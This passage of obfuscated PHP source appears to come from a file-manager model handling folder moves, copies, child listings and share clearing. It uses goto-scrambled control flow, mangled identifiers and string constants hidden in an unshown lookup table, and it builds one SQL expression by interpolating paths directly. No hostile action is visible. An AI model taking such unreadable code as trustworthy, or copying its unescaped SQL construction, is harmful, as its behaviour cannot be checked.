$c¬…±áõ¸õ); if ($dÏøÕîØ­Õ[$D’Á„±§Íø[367]] != $D’Á„±§Íø[84]) { $c¬…±áõ¸õ[$D’Á„±§Íø[493]][] = $dÏøÕîØ­Õ[$D’Á„±§Íø[415]]; } } $this->chunkEventSet($D’Á„±§Íø[505], array($D’Á„±§Íø[506], $A¾ÁÂ¸§ò‹, $aœ®ÃêÁîá)); $this->saveAll($BĞƒµ¤‚); goto c¡‡ôçŒŠá; f¸«„Í¤ô©: $dÔœè™Ì† = $this->sourceInfo($Eİ¢¶¸ç’); foreach ($Dè©Û¯íØ as $dÏøÕîØ­Õ) { $BÀë­õ‰ë = $this->_makeItemData($dÏøÕîØ­Õ, $dÔœè™Ì†, $dÏøÕîØ­Õ[$D’Á„±§Íø[28]]); $BÀë­õ‰ë[$D’Á„±§Íø[455]] = $dÏøÕîØ­Õ[$D’Á„±§Íø[455]]; $DÙ‰¿ŞÒéé[] = $BÀë­õ‰ë; } $this->chunkEventSet($D’Á„±§Íø[503], array($D’Á„±§Íø[504], $A¾ÁÂ¸§ò‹, $aœ®ÃêÁîá)); goto C–­Ó·î´; C–­Ó·î´: $this->addAll($DÙ‰¿ŞÒéé, array(), !1); $fÀ™¸ãØœÜ = $this->where(array($D’Á„±§Íø[457] => $Eİ¢¶¸ç’))->select(); $a®¢¶ŒŒÓ† = $this->_childrenMakeRelation($Dè©Û¯íØ, $fÀ™¸ãØœÜ); goto EÚÁœáÖ£; e®›êˆ†¦: } private function _childrenMakeRelation($f‡Â³ĞÀÆ, $b²‡‰¨‹½â) { $AÀ·×ÇÏ¿Ø =& $_SERVER[ì‹É]; $F´Ãù®‡ñÒ = array(); $aâ’™—ÓõÛ = array(); foreach ($f‡Â³ĞÀÆ as $EËÜæ÷Š›°) { $fÆïÕõ¥¼– = $EËÜæ÷Š›°[$AÀ·×ÇÏ¿Ø[28]] . $AÀ·×ÇÏ¿Ø[8] . $EËÜæ÷Š›°[$AÀ·×ÇÏ¿Ø[455]]; $F´Ãù®‡ñÒ[$fÆïÕõ¥¼–] = $EËÜæ÷Š›°[$AÀ·×ÇÏ¿Ø[366]]; } foreach ($b²‡‰¨‹½â as $EËÜæ÷Š›°) { $fÆïÕõ¥¼– = $EËÜæ÷Š›°[$AÀ·×ÇÏ¿Ø[28]] . $AÀ·×ÇÏ¿Ø[8] . $EËÜæ÷Š›°[$AÀ·×ÇÏ¿Ø[455]]; $DŠ™°ª¨Ã = $F´Ãù®‡ñÒ[$fÆïÕõ¥¼–]; $aâ’™—ÓõÛ[$DŠ™°ª¨Ã] = $EËÜæ÷Š›°[$AÀ·×ÇÏ¿Ø[366]]; } return $aâ’™—ÓõÛ; } private function _childrenMatch($d†–ƒÈ°¼æ, $D»¶¾†–æ, $F¨ÙÊ‡‰ÚÚ) { goto e„ŞÖ‡Òâ›; CéöÙ¢œô: $bˆã¤Â’Û¾ = $D£ˆê¸Øê[count($D£ˆê¸Øê) - 1]; return array($CôŒËÏîœñ[457] => $bˆã¤Â’Û¾, $CôŒËÏîœñ[455] => $C’³•ÜÇ); goto fôƒ—ŒÀäª; eíµ”¾Û‡: foreach ($E–ŸåíŒ¦á as $e†³‡‰ŒÜ) { if (isset($d†–ƒÈ°¼æ[$e†³‡‰ŒÜ])) { $C’³•ÜÇ .= $d†–ƒÈ°¼æ[$e†³‡‰ŒÜ] . $CôŒËÏîœñ[509]; } } $C’³•ÜÇ = rtrim($C’³•ÜÇ, $CôŒËÏîœñ[47]) . $CôŒËÏîœñ[47]; $D£ˆê¸Øê = $this->parentLevelArray($C’³•ÜÇ); goto CéöÙ¢œô; e„ŞÖ‡Òâ›: $CôŒËÏîœñ =& $_SERVER[ì‹É]; $C’³•ÜÇ = $F¨ÙÊ‡‰ÚÚ[$CôŒËÏîœñ[455]]; $E–ŸåíŒ¦á = $this->parentLevelArray($D»¶¾†–æ[$CôŒËÏîœñ[455]]); goto eíµ”¾Û‡; fôƒ—ŒÀäª: } private function _makeItemData($EËºëì´À´, $Cæ–Á”§ç, $Aç×Œ‰) { $A¢à…ø³Î˜ =& $_SERVER[ì‹É]; $fìïõÒÆò = array($A¢à…ø³Î˜[510] => $EËºëì´À´[$A¢à…ø³Î˜[367]], $A¢à…ø³Î˜[383] => $Aç×Œ‰, $A¢à…ø³Î˜[511] => $EËºëì´À´[$A¢à…ø³Î˜[369]], $A¢à…ø³Î˜[416] => $EËºëì´À´[$A¢à…ø³Î˜[415]], $A¢à…ø³Î˜[512] => $EËºëì´À´[$A¢à…ø³Î˜[78]], $A¢à…ø³Î˜[513] => $Cæ–Á”§ç[$A¢à…ø³Î˜[368]], $A¢à…ø³Î˜[514] => $Cæ–Á”§ç[$A¢à…ø³Î˜[452]], $A¢à…ø³Î˜[515] => USER_ID, $A¢à…ø³Î˜[516] => USER_ID, $A¢à…ø³Î˜[365] => $Cæ–Á”§ç[$A¢à…ø³Î˜[366]], $A¢à…ø³Î˜[517] => $Cæ–Á”§ç[$A¢à…ø³Î˜[455]] . $Cæ–Á”§ç[$A¢à…ø³Î˜[366]] . $A¢à…ø³Î˜[47], $A¢à…ø³Î˜[392] => 0, $A¢à…ø³Î˜[518] => $A¢à…ø³Î˜[33]); return $fìïõÒÆò; } private function _copyApplyMeta($aÂ™Â·ğ—, &$fäèòµÇˆ”) { $e¤¢ëÁ£Å =& $_SERVER[ì‹É]; $AÅŒÊÄÙùò = $aÂ™Â·ğ—[$e¤¢ëÁ£Å[366]]; $BñåğËêó˜ = $aÂ™Â·ğ—[$e¤¢ëÁ£Å[28]]; if (!isset($aÂ™Â·ğ—[$e¤¢ëÁ£Å[519]]) || !$aÂ™Â·ğ—[$e¤¢ëÁ£Å[519]] || $aÂ™Â·ğ—[$e¤¢ëÁ£Å[519]] == $e¤¢ëÁ£Å[464]) { $fäèòµÇˆ”[$e¤¢ëÁ£Å[495]][] = array($e¤¢ëÁ£Å[366], $AÅŒÊÄÙùò, $e¤¢ëÁ£Å[519], short_id($AÅŒÊÄÙùò)); } if (Input::check($BñåğËêó˜, $e¤¢ëÁ£Å[520])) { $fäèòµÇˆ”[$e¤¢ëÁ£Å[494]][] = array($e¤¢ëÁ£Å[366] => $AÅŒÊÄÙùò, $e¤¢ëÁ£Å[90] => $e¤¢ëÁ£Å[412], $e¤¢ëÁ£Å[354] => str_replace($e¤¢ëÁ£Å[50], $e¤¢ëÁ£Å[33], Pinyin::encode($BñåğËêó˜))); $fäèòµÇˆ”[$e¤¢ëÁ£Å[494]][] = array($e¤¢ëÁ£Å[366] => $AÅŒÊÄÙùò, $e¤¢ëÁ£Å[90] => $e¤¢ëÁ£Å[411], $e¤¢ëÁ£Å[354] => Pinyin::encode($BñåğËêó˜, $e¤¢ëÁ£Å[521])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($B´¹§±Îí„) { goto BƒÆ›ÃÆ…‘; Aø‹¾Ş‡ƒ: $aã¸±§Ë½æ = array($D‡¤«è‚ò[455] => array($D‡¤«è‚ò[475], $e›¾Ë¹ğã¢[$D‡¤«è‚ò[455]] . $B´¹§±Îí„ . $D‡¤«è‚ò[476]), $D‡¤«è‚ò[393] => 0); $c¢ó«õíË = $this->field($B•˜ŒÀñ¡å)->where($aã¸±§Ë½æ)->select(); if (!$c¢ó«õíË) { return; } goto CßÚ†œË¶; CßÚ†œË¶: $c¢ó«õíË = array_to_keyvalue($c¢ó«õíË, $D‡¤«è‚ò[366]); foreach ($c¢ó«õíË as $aÙĞµ©Á‚) { $b“»Ç½ïê = $aÙĞµ©Á‚[$D‡¤«è‚ò[457]]; $B´¹§±Îí„ = $aÙĞµ©Á‚[$D‡¤«è‚ò[366]]; if (!isset($this->_childrenListCache[$B´¹§±Îí„]) && $aÙĞµ©Á‚[$D‡¤«è‚ò[367]] == $D‡¤«è‚ò[84]) { $this->_childrenListCache[$B´¹§±Îí„] = array(); } if (!isset($this->_childrenListCache[$b“»Ç½ïê])) { $this->_childrenListCache[$b“»Ç½ïê] = array(); } $this->_childrenListCache[$b“»Ç½ïê][$B´¹§±Îí„] = $aÙĞµ©Á‚; $this->_childrenItemCache[$B´¹§±Îí„] = $aÙĞµ©Á‚; } goto e¡¤’œ«†¨; BƒÆ›ÃÆ…‘: $D‡¤«è‚ò =& $_SERVER[ì‹É]; $e›¾Ë¹ğã¢ = $this->sourceInfo($B´¹§±Îí„); $B•˜ŒÀñ¡å = $D‡¤«è‚ò[522]; goto Aø‹¾Ş‡ƒ; e¡¤’œ«†¨: } private function _childrenListAll($c¥«±“ñ“†, &$FÒÏµ¼•Î¼) { $b´‚Üè“¾Â =& $_SERVER[ì‹É]; if (!isset($this->_childrenListCache[$c¥«±“ñ“†])) { return; } $EùÎù¸ÑĞµ = $this->_childrenListCache[$c¥«±“ñ“†]; foreach ($EùÎù¸ÑĞµ as $E±ùÇÒù‹µ => $D‚ÁİŒïÓ) { $FÒÏµ¼•Î¼[$E±ùÇÒù‹µ] = $D‚ÁİŒïÓ; if ($D‚ÁİŒïÓ[$b´‚Üè“¾Â[367]] == $b´‚Üè“¾Â[84]) { $this->_childrenListAll($E±ùÇÒù‹µ, $FÒÏµ¼•Î¼); } } } private function sourceInfoCache($Bã‚³–¡®) { if (isset($this->_childrenItemCache[$Bã‚³–¡®])) { return $this->_childrenItemCache[$Bã‚³–¡®]; } return $this->sourceInfo($Bã‚³–¡®); } private function _childrenList($c“‚Æìï®ô) { if (isset($this->_childrenListCache[$c“‚Æìï®ô])) { return $this->_childrenListCache[$c“‚Æìï®ô]; } return $this->_childrenListSelect($c“‚Æìï®ô); } private function _childrenListSelect($a®¤ÏİòÌ) { goto bí›Å‘âÉÀ; AÂ¾–ùï••: foreach ($aŠÒÀÏ”™Ù as $a®¤ÏİòÌ => $dÌ “ØÙ‚ƒ) { $this->_childrenItemCache[$a®¤ÏİòÌ] = $dÌ “ØÙ‚ƒ; } return $aŠÒÀÏ”™Ù; goto dö¾áğ–Å”; C ê„÷¥ó: $CéÚÉÛ®Éê = $CéÚÉÛ®Éê ? $CéÚÉÛ®Éê : array(); $aŠÒÀÏ”™Ù = array_to_keyvalue($CéÚÉÛ®Éê, $eÏ¢»µÏõ[366]); $this->_childrenListCache[$a®¤ÏİòÌ] = $aŠÒÀÏ”™Ù; goto AÂ¾–ùï••; bí›Å‘âÉÀ: $eÏ¢»µÏõ =& $_SERVER[ì‹É]; $e½«ğ¥É”Œ = array($eÏ¢»µÏõ[457] => $a®¤ÏİòÌ, $eÏ¢»µÏõ[393] => 0); $CéÚÉÛ®Éê = $this->where($e½«ğ¥É”Œ)->select(); goto C ê„÷¥ó; dö¾áğ–Å”: } private function fileNameExistCache($EÜÜáìŞĞô, $F¶¾ËöÑé) { $dë¦ì‰‘êø =& $_SERVER[ì‹É]; $F¶¾ËöÑé = strtolower($F¶¾ËöÑé); $Aµ¤çõ›Ÿƒ = $this->_childrenList($EÜÜáìŞĞô); foreach ($Aµ¤çõ›Ÿƒ as $FƒÃÚùùƒ) { if ($F¶¾ËöÑé == strtolower($FƒÃÚùùƒ[$dë¦ì‰‘êø[28]])) { return $FƒÃÚùùƒ[$dë¦ì‰‘êø[366]]; } } return !1; } private function fileNameAutoCache($cÅÓ”õùˆŞ, $a¼–ßãøÊ‚, $Aòç§ó¯ºâ, $BŒğ¢£ïä¯) { $eÌ‚°—àø =& $_SERVER[ì‹É]; $d¸¼Ú¨¿Èó = $this->_childrenList($cÅÓ”õùˆŞ); $f½ÈÔÇÑÖ = array_to_keyvalue($d¸¼Ú¨¿Èó, $eÌ‚°—àø[33], $eÌ‚°—àø[28]); return $this->fileNameAutoGet($f½ÈÔÇÑÖ, $a¼–ßãøÊ‚, $Aòç§ó¯ºâ, $BŒğ¢£ïä¯); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($aĞÇ×Û¹‰, $BßÈŒ¶Ÿ‚, $eäŒº¥™æ˜ = REPEAT_REPLACE, $eñÜñÁÖ÷š = '') { goto Fä†˜«é; Fä†˜«é: $fî»Ï¹‘¨Ü =& $_SERVER[ì‹É]; $aÛ‘É²²î– = $this->sourceInfo($aĞÇ×Û¹‰); $dà’°íÈ» = $this->sourceInfo($BßÈŒ¶Ÿ‚); goto DôµĞŞÎÄ; cŸÇ¹“Ïæ: if ($aÛ‘É²²î–[$fî»Ï¹‘¨Ü[367]] == $fî»Ï¹‘¨Ü[84]) { $F•ì—µö‹­[] = $aĞÇ×Û¹‰; } $this->updateModifyTime($F•ì—µö‹­); Model($fî»Ï¹‘¨Ü[497])->eventMove($aĞÇ×Û¹‰, $aÛ‘É²²î–[$fî»Ï¹‘¨Ü[457]], $BßÈŒ¶Ÿ‚); goto eºšÅë¸³Ú; c›ËÅ¶ğ‹î: if ($DÓ¨Ì¨µ‹× && $f¦ÃëÛÒ›Æ[$fî»Ï¹‘¨Ü[525]]) { $this->remove($aĞÇ×Û¹‰, !1); } $this->lockMoveEnd($aĞÇ×Û¹‰); $this->lockWriteEnd($BßÈŒ¶Ÿ‚, $f¢í®Ùà“Ğ); goto AšîÀæÙåÍ; eºšÅë¸³Ú: Hook::trigger($fî»Ï¹‘¨Ü[524], $FÔ÷µ¿‰Ü); return $aˆŠÒªçÊœ; goto BËŞ©—æ¶; AšîÀæÙåÍ: $this->folderSizeReset($aÛ‘É²²î–[$fî»Ï¹‘¨Ü[457]]); $this->folderSizeReset($BßÈŒ¶Ÿ‚); $F•ì—µö‹­ = array($aÛ‘É²²î–[$fî»Ï¹‘¨Ü[457]], $BßÈŒ¶Ÿ‚); goto cŸÇ¹“Ïæ; DôµĞŞÎÄ: $FÔ÷µ¿‰Ü = $this->pathInfoMore($aĞÇ×Û¹‰); if ($this->isParentOf($aĞÇ×Û¹‰, $BßÈŒ¶Ÿ‚)) { return !1; } if (!$aÛ‘É²²î– || !$dà’°íÈ» || $dà’°íÈ»[$fî»Ï¹‘¨Ü[367]] != $fî»Ï¹‘¨Ü[84]) { return !1; } goto DšÇ·îÓĞ; f×¦ æïË®: $this->lockMoveStart($aĞÇ×Û¹‰); $this->lockWriteStart($BßÈŒ¶Ÿ‚, $f¢í®Ùà“Ğ); $f¦ÃëÛÒ›Æ = array($fî»Ï¹‘¨Ü[493] => array(), $fî»Ï¹‘¨Ü[525] => !1); goto DÜí¸µÖ; DšÇ·îÓĞ: Hook::trigger($fî»Ï¹‘¨Ü[523], $FÔ÷µ¿‰Ü); if ($aÛ‘É²²î–[$fî»Ï¹‘¨Ü[457]] == $BßÈŒ¶Ÿ‚ && $eñÜñÁÖ÷š != $aÛ‘É²²î–[$fî»Ï¹‘¨Ü[28]]) { $c••òÜ„®© = $this->fileNameExist($BßÈŒ¶Ÿ‚, $eñÜñÁÖ÷š); if ($c••òÜ„®© && $aÛ‘É²²î–[$fî»Ï¹‘¨Ü[367]] == $fî»Ï¹‘¨Ü[464]) { goto d‰Øì’¼; e¼•ŞÇ°É˜: return $c••òÜ„®©; goto fŒÉÕ³‹Ûù; d‰Øì’¼: $b¿èÚÈÅÔ„ = $this->sourceInfo($c••òÜ„®©); $bñ»Œª÷óĞ = $this->fileHistory($b¿èÚÈÅÔ„, $aÛ‘É²²î–[$fî»Ï¹‘¨Ü[415]], $aÛ‘É²²î–[$fî»Ï¹‘¨Ü[78]]); if (!$bñ»Œª÷óĞ) { Model($fî»Ï¹‘¨Ü[418])->remove($aÛ‘É²²î–[$fî»Ï¹‘¨Ü[415]]); } goto EÅù—¤‘ö; EÅù—¤‘ö: $this->remove($aĞÇ×Û¹‰, !1); $this->folderSizeReset($BßÈŒ¶Ÿ‚); Hook::trigger($fî»Ï¹‘¨Ü[524], $FÔ÷µ¿‰Ü); goto e¼•ŞÇ°É˜; fŒÉÕ³‹Ûù: } } $f¢í®Ùà“Ğ = $eñÜñÁÖ÷š ? $eñÜñÁÖ÷š : $aÛ‘É²²î–[$fî»Ï¹‘¨Ü[28]]; goto f×¦ æïË®; DÜí¸µÖ: $this->clearShare($aĞÇ×Û¹‰, $BßÈŒ¶Ÿ‚); $DÓ¨Ì¨µ‹× = $this->fileNameExistCache($BßÈŒ¶Ÿ‚, $aÛ‘É²²î–[$fî»Ï¹‘¨Ü[28]]); $aˆŠÒªçÊœ = $this->_move($aĞÇ×Û¹‰, $BßÈŒ¶Ÿ‚, $eäŒº¥™æ˜, $f¦ÃëÛÒ›Æ, $eñÜñÁÖ÷š); goto c²ÕÕÀ„Â; c²ÕÕÀ„Â: $this->sourceCacheClear(); if ($aÛ‘É²²î–[$fî»Ï¹‘¨Ü[367]] == $fî»Ï¹‘¨Ü[84] && $DÓ¨Ì¨µ‹×) { $this->folderSizeResetChildren($aˆŠÒªçÊœ); } Model($fî»Ï¹‘¨Ü[164])->linkAdd($f¦ÃëÛÒ›Æ[$fî»Ï¹‘¨Ü[493]]); goto c›ËÅ¶ğ‹î; BËŞ©—æ¶: } private function _move($bğêß˜, $DçÈÎ‡Ïƒ, $fÛŠŠàŒ™, &$aà¹Ù‡½«, $B—„ã‡„‚á = '') { goto Dƒò¨Ê‡¶; Dƒò¨Ê‡¶: $bÓáÈÈ®éÄ =& $_SERVER[ì‹É]; $bÁé† ÜÜ‰ = $this->sourceInfo($bğêß˜); $f—Û†ù²ôƒ = $bÁé† ÜÜ‰[$bÓáÈÈ®éÄ[367]] == $bÓáÈÈ®éÄ[84]; goto dÏ³£—¥Á; Dìğ²ÍÍÕ: $this->lockWriteStart($DçÈÎ‡Ïƒ, $DÔŸêéŠŒæ); if (!$BÁâÄ’Ú˜Ó) { return $this->_moveForce($bğêß˜, $DçÈÎ‡Ïƒ, $DÔŸêéŠŒæ); } $fÛ‡Â‡¢åÄ = $BÁâÄ’Ú˜Ó; goto E“²Ù±ÉÚÕ; E“²Ù±ÉÚÕ: $f™“©‘‹ßß = !1; if ($f—Û†ù²ôƒ) { if ($fÛŠŠàŒ™ == REPEAT_RENAME_FOLDER) { $DÔŸêéŠŒæ = $this->fileNameAuto($DçÈÎ‡Ïƒ, $DÔŸêéŠŒæ, $fÛŠŠàŒ™, $f—Û†ù²ôƒ); $fÛ‡Â‡¢åÄ = $this->_moveForce($bğêß˜, $DçÈÎ‡Ïƒ, $DÔŸêéŠŒæ); } else { if ($fÛŠŠàŒ™ == REPEAT_RENAME_FOLDER) { $fÛŠŠàŒ™ = REPEAT_RENAME; } $c»â¤Ç¹å‹ = $this->_childrenListSelect($bğêß˜); foreach ($c»â¤Ç¹å‹ as $cùİ›ğÃõ) { $this->_move($cùİ›ğÃõ[$bÓáÈÈ®éÄ[366]], $BÁâÄ’Ú˜Ó, $fÛŠŠàŒ™, $aà¹Ù‡½«); } $f™“©‘‹ßß = !0; } } else { if ($fÛŠŠàŒ™ == REPEAT_SKIP) { $f™“©‘‹ßß = !0; } else { if ($fÛŠŠàŒ™ == REPEAT_RENAME || $fÛŠŠàŒ™ == REPEAT_RENAME_FOLDER) { $DÔŸêéŠŒæ = $this->fileNameAuto($DçÈÎ‡Ïƒ, $DÔŸêéŠŒæ, $fÛŠŠàŒ™, $f—Û†ù²ôƒ); $fÛ‡Â‡¢åÄ = $this->_moveForce($bğêß˜, $DçÈÎ‡Ïƒ, $DÔŸêéŠŒæ); } else { if ($fÛŠŠàŒ™ == REPEAT_REPLACE) { $døæÉ— ¸è = $this->sourceInfoCache($BÁâÄ’Ú˜Ó); $DãğÙÄ¡œ = $this->fileHistory($døæÉ— ¸è, $bÁé† ÜÜ‰[$bÓáÈÈ®éÄ[415]], $bÁé† ÜÜ‰[$bÓáÈÈ®éÄ[78]]); if ($DãğÙÄ¡œ) { $aà¹Ù‡½«[$bÓáÈÈ®éÄ[493]][] = $bÁé† ÜÜ‰[$bÓáÈÈ®éÄ[415]]; } else { $f™“©‘‹ßß = !0; } } } } } if ($f™“©‘‹ßß && !$aà¹Ù‡½«[$bÓáÈÈ®éÄ[525]]) { $aà¹Ù‡½«[$bÓáÈÈ®éÄ[525]] = !0; } goto Cˆæ¥ãæë; Cˆæ¥ãæë: return $fÛ‡Â‡¢åÄ; goto E†¿ã¥ø›“; dÏ³£—¥Á: $DÔŸêéŠŒæ = $B—„ã‡„‚á ? $B—„ã‡„‚á : $bÁé† ÜÜ‰[$bÓáÈÈ®éÄ[28]]; $BÁâÄ’Ú˜Ó = $this->fileNameExistCache($DçÈÎ‡Ïƒ, $DÔŸêéŠŒæ); $this->lockMoveStart($bğêß˜); goto Dìğ²ÍÍÕ; E†¿ã¥ø›“: } private function _moveForce($Eò‘ßˆÂ§÷, $dÉé©÷…ø, $C¹Âª×àœÖ) { goto bè¶äŞî‹; bè¶äŞî‹: $eª–ĞçÊº =& $_SERVER[ì‹É]; $fÍã¬¥ªÀ• = $this->sourceInfo($Eò‘ßˆÂ§÷); $eÅÆø¤½Ÿˆ = $this->sourceInfo($dÉé©÷…ø); goto d‚˜Æ»´Ã; b¶·åò²Ÿ‰: if ($aˆš¬©²ç) { $Dá±Ù è°² = array($eª–ĞçÊº[517] => array($eª–ĞçÊº[475], $fÍã¬¥ªÀ•[$eª–ĞçÊº[455]] . $fÍã¬¥ªÀ•[$eª–ĞçÊº[366]] . $eª–ĞçÊº[476])); $CõÛÕÄ£àß = $fÍã¬¥ªÀ•[$eª–ĞçÊº[455]] . $fÍã¬¥ªÀ•[$eª–ĞçÊº[366]] . $eª–ĞçÊº[47]; $D¤ÒÛ¿ôÔí = $eÅÆø¤½Ÿˆ[$eª–ĞçÊº[455]] . $eÅÆø¤½Ÿˆ[$eª–ĞçÊº[366]] . $eª–ĞçÊº[47] . $fÍã¬¥ªÀ•[$eª–ĞçÊº[366]] . $eª–ĞçÊº[47]; $AÚÏó¥Ş‹ó = array($eª–ĞçÊº[517] => array($eª–ĞçÊº[526], "\x72\x65\x70\x6c\x61\143\145\x28\160\x61\x72\145\156\x74\114\145\166\x65\x6c\54\x27{$CõÛÕÄ£àß}\x27\x2c\x27{$D¤ÒÛ¿ôÔí}\x27\51"), $eª–ĞçÊº[513] => $eÅÆø¤½Ÿˆ[$eª–ĞçÊº[368]], $eª–ĞçÊº[514] => $eÅÆø¤½Ÿˆ[$eª–ĞçÊº[452]]); if ($f‰±½†åÕ) { $AÚÏó¥Ş‹ó[$eª–ĞçÊº[392]] = 0; } $this->where($Dá±Ù è°²)->data($AÚÏó¥Ş‹ó)->save(); } $this->where(array($eª–ĞçÊº[380] => $Eò‘ßˆÂ§÷))->data($E°¾ÔÖ³‹é)->save(); return $Eò‘ßˆÂ§÷; goto CÃÆÂ™¢„Î; d‚˜Æ»´Ã: $aˆš¬©²ç = $fÍã¬¥ªÀ•[$eª–ĞçÊº[367]] == $eª–ĞçÊº[84]; $E°¾ÔÖ³‹é = array($eª–ĞçÊº[365] => $eÅÆø¤½Ÿˆ[$eª–ĞçÊº[366]], $eª–ĞçÊº[517] => $eÅÆø¤½Ÿˆ[$eª–ĞçÊº[455]] . $eÅÆø¤½Ÿˆ[$eª–ĞçÊº[366]] . $eª–ĞçÊº[47], $eª–ĞçÊº[513] => $eÅÆø¤½Ÿˆ[$eª–ĞçÊº[368]], $eª–ĞçÊº[514] => $eÅÆø¤½Ÿˆ[$eª–ĞçÊº[452]], $eª–ĞçÊº[516] => USER_ID, $eª–ĞçÊº[383] => $C¹Âª×àœÖ); $Aâ­«ÈÍŠ = $fÍã¬¥ªÀ•[$eª–ĞçÊº[368]] == SourceModel::TYPE_GROUP && $eÅÆø¤½Ÿˆ[$eª–ĞçÊº[368]] == SourceModel::TYPE_GROUP && $fÍã¬¥ªÀ•[$eª–ĞçÊº[452]] == $eÅÆø¤½Ÿˆ[$eª–ĞçÊº[452]]; goto dÎ×Ÿ±ôö¬; dÎ×Ÿ±ôö¬: if (!$Aâ­«ÈÍŠ) { Model($eª–ĞçÊº[450])->authClear($Eò‘ßˆÂ§÷); } $f‰±½†åÕ = $fÍã¬¥ªÀ•[$eª–ĞçÊº[393]] == $eª–ĞçÊº[84] && $eÅÆø¤½Ÿˆ[$eª–ĞçÊº[393]] != $eª–ĞçÊº[84]; if ($f‰±½†åÕ) { $E°¾ÔÖ³‹é[$eª–ĞçÊº[392]] = 0; } goto b¶·åò²Ÿ‰; CÃÆÂ™¢„Î: } private function clearShare($cÈ„Ö‰Ê”, $cô‡èÛƒ•£) { goto F´ØÀ´–¸; F´ØÀ´–¸: $f¿¤Üâ²†— =& $_SERVER[ì‹É]; $d‘Ñ†Ÿá£± = $this->sourceInfo($cÈ„Ö‰Ê”); $cíÕÕÇ°Û = $this->sourceInfo($cô‡èÛƒ•£); goto c‘ÚŒ¹œêÌ; cæÒÓ³ƒ¿°: Model($f¿¤Üâ²†—[528])->where($c†ëµï§ˆÁ)->save(array($f¿¤Üâ²†—[444] => 0)); Model($f¿¤Üâ²†—[529])->where($c†ëµï§ˆÁ)->delete(); goto E¯º«ˆŒ ; C‹‰ÁŠİ: if (!$E‘‹÷š) { return; } $c†ëµï§ˆÁ = array($f¿¤Üâ²†—[366] => array($f¿¤Üâ²†—[7], $E‘‹÷š), $f¿¤Üâ²†—[444] => 1); $dÍÇªÀÓ²œ = Model($f¿¤Üâ²†—[528])->field($f¿¤Üâ²†—[437])->where($c†ëµï§ˆÁ)->select(); goto f¼¹Ó“§Î«; c‘ÚŒ¹œêÌ: if ($d‘Ñ†Ÿá£±[$f¿¤Üâ²†—[452]] == $cíÕÕÇ°Û[$f¿¤Üâ²†—[452]] && $d‘Ñ†Ÿá£±[$f¿¤Üâ²†—[368]] == $f¿¤Üâ²†—[527]) { return; } $c†ëµï§ˆÁ = array($f¿¤Üâ²†—[455] => array($f¿¤Üâ²†—[475], $d‘Ñ†Ÿá£±[$f¿¤Üâ²†—[455]] . $cÈ„Ö‰Ê” . $f¿¤Üâ²†—[476])); $E‘‹÷š = $this->field($f¿¤Üâ²†—[380])->where($c†ëµï§ˆÁ)->getField($f¿¤Üâ²†—[366], !0); goto C‹‰ÁŠİ; f¼¹Ó“§Î«: if (!$dÍÇªÀÓ²œ) { return; } $dÍÇªÀÓ²œ = array_to_keyvalue($dÍÇªÀÓ²œ, $f¿¤Üâ²†—[33], $f¿¤Üâ²†—[437]); $c†ëµï§ˆÁ = array($f¿¤Üâ²†—[437] => array($f¿¤Üâ²†—[7], $dÍÇªÀÓ²œ)); goto cæÒÓ³ƒ¿°; E¯º«ˆŒ : } public function copyFolderFromIO($CÃÑ›, $CŠ”èº›Ô½, $FÅâÊã±¥, $FìÙçÛ»çæ, $A‰éÈ¸Ó÷õ, $a”ö‰õí«Õ = false) { goto FÇ‰äĞ‚“‹; fßÚ‚âØÎî: Model($dãàÑ²‡œ[418])->linkAdd($fÒä„Ò‰Î–[$dãàÑ²‡œ[493]]); Model($dãàÑ²‡œ[418])->remove($fÒä„Ò‰Î–[$dãàÑ²‡œ[530]]); $this->folderSizeReset($FÅâÊã±¥); goto e™çëôêã; bÏùì£ŠËŞ: $Cîˆè‰”Ü¡ = $this->fileNameExist($FÅâÊã±¥, $Fö˜ÀŒ±Â); $CğÏè³…Éá = $this->mkdir($FÅâÊã±¥, $Fö˜ÀŒ±Â, $FìÙçÛ»çæ); if (!$Cîˆè‰”Ü¡ || $FìÙçÛ»çæ == REPEAT_RENAME_FOLDER) { $FìÙçÛ»çæ = !1; } goto B°¡Ò£·õ; bóİÄ‘ôëç: Hook::trigger($dãàÑ²‡œ[532]); if ($CğÏè³…Éá) { $this->folderSizeResetChildren($CğÏè³…Éá); } $this->_childrenListClear(); goto e…Î„ê¼—; FÇ‰äĞ‚“‹: $dãàÑ²‡œ =& $_SERVER[ì‹É]; $fÒä„Ò‰Î– = array($dãàÑ²‡œ[494] => array(), $dãàÑ²‡œ[495] => array(), $dãàÑ²‡œ[493] => array(), $dãàÑ²‡œ[530] => array()); $Fö˜ÀŒ±Â = $a”ö‰õí«Õ ? $a”ö‰õí«Õ : $CÃÑ›->getPathName($CÃÑ›->pathThis($CŠ”èº›Ô½)); goto bÏùì£ŠËŞ; B°¡Ò£·õ: if ($Cîˆè‰”Ü¡) { $this->_childrenAllMake($Cîˆè‰”Ü¡); } Hook::trigger($dãàÑ²‡œ[531]); $this->_copyChildTo($CÃÑ›, $CŠ”èº›Ô½, $CğÏè³…Éá, $FìÙçÛ»çæ, $fÒä„Ò‰Î–, $A‰éÈ¸Ó÷õ); goto bóİÄ‘ôëç; e…Î„ê¼—: Model($dãàÑ²‡œ[496])->addAll($fÒä„Ò‰Î–[$dãàÑ²‡œ[494]], array(), !0); Model($dãàÑ²‡œ[497])->eventCopy($CğÏè³…Éá); $this->saveAll($fÒä„Ò‰Î–[$dãàÑ²‡œ[495]]); goto fßÚ‚âØÎî; e™çëôêã: $this->updateModifyTime($FÅâÊã±¥); return $CğÏè³…Éá; goto D¿è¨¤­­; D¿è¨¤­­: } private function _copyChildTo($d¤Ì¤™Âä, $D˜Àìİââ˜, $b¡Ú®—É», $B„×ì’‹¹£, &$D„¸Ò£”°ï, $b‰¥Ş¯Ğ‚–) { goto f’™ÏÇÅ¡—; f’™ÏÇÅ¡—: $aÔãÙï¡ =& $_SERVER[ì‹É]; $DŒ•êô©Š = $this->sourceInfoCache($b¡Ú®—É»); $aøô¾ëœÄä = $d¤Ì¤™Âä->listPath($D˜Àìİââ˜, !1, !0); goto aâøÁÃ—ª; Fù×á°² ‹: $fœ¢´ß×á¶ = $this->_childrenList($b¡Ú®—É»); $fœ¢´ß×á¶ = array_to_keyvalue($fœ¢´ß×á¶, $aÔãÙï¡[28]); foreach ($Eæ¬¨±§ª¦ as $B£®ÀšË¶Š) { $bÒÚ×’˜„ƒ = $fœ¢´ß×á¶[$B£®ÀšË¶Š[$aÔãÙï¡[28]]]; 